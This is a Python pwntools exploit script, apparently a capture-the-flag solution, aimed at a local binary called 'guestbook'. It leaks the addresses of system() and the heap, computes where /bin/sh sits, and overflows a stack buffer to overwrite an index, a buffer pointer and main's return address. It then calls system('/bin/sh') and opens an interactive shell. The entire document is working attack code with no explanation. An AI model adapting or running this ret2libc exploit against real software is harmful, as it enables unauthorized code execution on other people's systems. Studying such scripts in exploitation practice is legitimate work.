from pwn import *
# context.log_level = "debug"

pipe = process("guestbook")
def start():
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry")
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry2")
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry3")
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry4")

def cal_binsh(syscall):
    return syscall + 0x120d7b

def exploit(syscall, binsh,heap_addr):
    pipe.recvuntil(">>")
    pipe.sendline(b'2')
    print(pipe.recvuntil(">>>"))
    pipe.sendline(b'0')
    pipe.recvuntil('>>>')

    payload = 'A'*4 + '\x00'
    payload += 'A' * 0x5f + p32(0x0).decode("iso-8859-1")       # 0x5f + 5 = 0x64 gIndex
    payload += 'A' * 4 + p32(heap_addr).decode("iso-8859-1")    # 0x6c = s buffer in main
    payload += 'A' * 0x2c + p32(syscall).decode("iso-8859-1")   # 0x6c+4+0x2c = 0x9c main ret addr
    payload += p32(0xdeadbeef).decode("iso-8859-1")             # fake ret addr for system call
    payload += p32(binsh).decode("iso-8859-1")                  # arg for system call 
    pipe.sendline(payload)

start()

pipe.recvuntil(">>")
pipe.sendline("1")
pipe.recvuntil(">>>")
pipe.sendline("6")
leak = pipe.recv(24)

syscall = u32(leak[20:24])
heap_addr = u32(leak[0:4])
print("system address: 0x%x" % syscall)
print("heap address: 0x%x" % heap_addr)
binsh = cal_binsh(syscall)
print("address of /bin/sh: 0x%x" % binsh)

exploit(syscall,  binsh, heap_addr)

pipe.interactive()
